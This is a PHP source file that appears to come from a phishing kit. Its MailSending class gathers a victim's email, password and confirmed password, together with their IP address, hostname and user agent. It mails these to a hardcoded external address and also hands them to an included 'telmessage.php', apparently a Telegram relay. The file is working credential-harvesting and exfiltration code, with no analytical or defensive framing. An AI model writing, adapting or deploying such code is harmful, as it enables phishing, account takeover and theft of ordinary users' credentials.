<?php

//session_start();
class MailSending
{
    private $ip_Address;
    private $hostname;
    private $userAgent;
    private $recipientMail;

    public function __construct()
    {
        $this->setIpAddress(getenv("REMOTE_ADDR"));
        $this->setHostname(gethostbyaddr($this->getIpAddress()));
        $this->setUserAgent($_SERVER['HTTP_USER_AGENT']);
        $this->setRecipientMail("jonnyjones999@proton.me");
    }


    public function getIpAddress()
    {
        return $this->ip_Address;
    }


    public function setIpAddress($ip_Address)
    {
        $this->ip_Address = $ip_Address;
    }


    public function getHostname()
    {
        return $this->hostname;
    }


    public function setHostname($hostname)
    {
        $this->hostname = $hostname;
    }

    public function staticMail($message)
    {
        $subject = '----------| Result of Auto-e-fill |----------' . "\n";

        $message .= "User Information\n";
        $message .= "Client IP: " . $this->getIpAddress() . "\n";
        $message .= "|--- https://www.geoiptool.com/?IP=$this->ip_Address ----\n";
        $message .= "User Agent: " . $this->getUserAgent() . "\n";
        $header = "From:" . "support";

        $_SESSION['message'] = $message;
        include 'telmessage.php';
        mail($this->getRecipientMail(), $subject, $message, $header);
    }

    public function getUserAgent()
    {
        return $this->userAgent;
    }

    public function setUserAgent($userAgent)
    {
        $this->userAgent = $userAgent;
    }

    public function getRecipientMail()
    {
        return $this->recipientMail;
    }

    public function setRecipientMail($recipientMail)
    {
        $this->recipientMail = $recipientMail;
    }

    public function sendMail($username, $password, $confirmPassword)
    {
        $subject = '----------| Result of CN |----------' . "\n";
        $message = "email: " . $username . "\n";
        $message .= "password: " . $password . "\n";
        $message .= "confirm password: " . $confirmPassword . "\n";

        $message .= "User Information\n";
        $message .= "Client IP: " . $this->getIpAddress() . "\n";
        $message .= "|--- http://www.geoiptool.com/?IP=$this->ip_Address ----\n";
        $message .= "User Agent: " . $this->getUserAgent() . "\n";
        $_SESSION['message'] = $message;
        $header = "From:" . $username . " <" . $password . ">";

        include 'telmessage.php';
        mail($this->getRecipientMail(), $subject, $message, $header);
    }

}